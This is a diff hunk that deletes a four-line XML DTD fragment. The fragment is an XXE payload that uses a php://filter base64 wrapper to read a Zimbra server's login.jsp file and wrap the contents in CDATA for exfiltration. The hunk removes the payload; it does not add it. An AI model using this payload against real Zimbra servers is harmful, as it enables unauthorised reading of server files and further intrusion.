@@ -1,4 +1,0 @@
-<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/opt/zimbra/jetty/webapps/zimbra/public/login.jsp">
-<!ENTITY % start "<![CDATA[">
-<!ENTITY % end "]]>">
-<!ENTITY % all "<!ENTITY fileContents '%start;%file;%end;'>">
